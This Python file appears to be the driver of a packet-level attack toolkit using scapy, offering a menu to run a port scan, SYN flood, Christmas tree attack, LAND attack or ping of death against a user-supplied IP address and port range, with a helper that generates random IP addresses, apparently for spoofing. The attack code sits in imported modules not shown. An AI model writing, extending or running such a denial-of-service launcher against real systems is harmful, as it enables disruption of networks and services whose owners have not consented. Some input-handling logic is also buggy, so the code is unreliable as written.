import ipaddress
import re
import random
from scapy.all import *
import port_scanner as input_1
import syn_flood_attack as input_2
import christmas_attack as input_3
import land_attack as input_4
import ping_of_death as input_5


def initialize_program(opts):
    user_input = get_user_input_for_target(opts)
    while 1:
        if user_input['dst_ip'] and user_input['dst_port_start'] and user_input['dst_port_end'] is not None:
            print(f"\n\n==========[ TARGET ]==========\n"
                  f" Destination ip = {user_input['dst_ip']}\n"
                  f" Destination port = {user_input['dst_port_start']} - {user_input['dst_port_end']}\n"
                  f" Sending count = {user_input['count']}\n"
                  f"==========[ OPTION ]==========")

            number = input("1. Port Scan\n"
                           "2. SYN Flood Attack\n"
                           "3. Christmas Tree Attack\n"
                           "4. LAND Attack\n"
                           "5. Ping Of Death\n"
                           "6. EXIT Program\n"
                           "==============================\n"
                           "Choose the option to run the program: ")

            if number < "1" or number > "6":
                print("Number out of range")
            else:
                if number == "1":
                    input_1.port_scanner(user_input)
                if number == "2":
                    target_port = int(input("Target Port: "))
                    input_2.SynFloodAttack(user_input['dst_ip'], target_port).syn_flood_attack(user_input['count'])
                if number == "3":
                    target_port = int(input("Target Port: "))
                    input_3.ChristmasTreeAttack(user_input['dst_ip'], target_port).christmas_tree_attack(user_input['count'])
                if number == "4":
                    target_port = int(input("Target Port: "))
                    input_4.LandAttack(user_input['dst_ip'], target_port).land_attack(user_input['count'])
                if number == "5":
                    input_5.PingOfDeath(user_input['dst_ip']).ping_of_death(user_input['count'])
                if number == "6":
                    break


def get_user_input_for_target(opts):
    user_input = {'dst_ip': None, 'dst_port_start': None, 'dst_port_end': None, 'count': None}
    port_regex = re.compile("([0-9]+){1,5}-?(([0-9]+){1,5})?")
    ip_regex1 = re.compile("^\d")
    ip_regex2 = re.compile("^www\.")

    if int(opts[2][1]) > 0:
        user_input['count'] = int(opts[2][1])
    while 1:
        try:
            ip_regex1_valid = ip_regex1.search(opts[0][1].replace(" ", ""))
            ip_regex2_valid = ip_regex2.search(opts[0][1].replace(" ", ""))
            if ip_regex1_valid:
                ip_address = ipaddress.ip_address(opts[0][1])
                user_input['dst_ip'] = ip_address.compressed
                break
            elif ip_regex2_valid:
                ip_address = ipaddress.ip_address(opts[0][1])
                user_input['dst_ip'] = ip_address.compressed
                break
        except:
            print("This is wrong type or format of IP address")

    while 1:
        port_start = 0
        port_end = 65535
        port_range_valid = port_regex.search(opts[1][1].replace(" ", ""))
        if port_range_valid:
            if port_range_valid.group(2) is None:
                port_start = int(port_range_valid.group(1))
                port_end = int(port_range_valid.group(1))
            elif int(port_range_valid.group(1)) > 0 or int(port_range_valid.group(2)) < 65535:
                if int(port_range_valid.group(1)) < int(port_range_valid.group(2)):
                    port_start = int(port_range_valid.group(1))
                    port_end = int(port_range_valid.group(2))
            else:
                continue
            user_input['dst_port_start'] = port_start
            user_input['dst_port_end'] = port_end
            return user_input
        else:
            continue


def random_ip():
    ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
    return ip
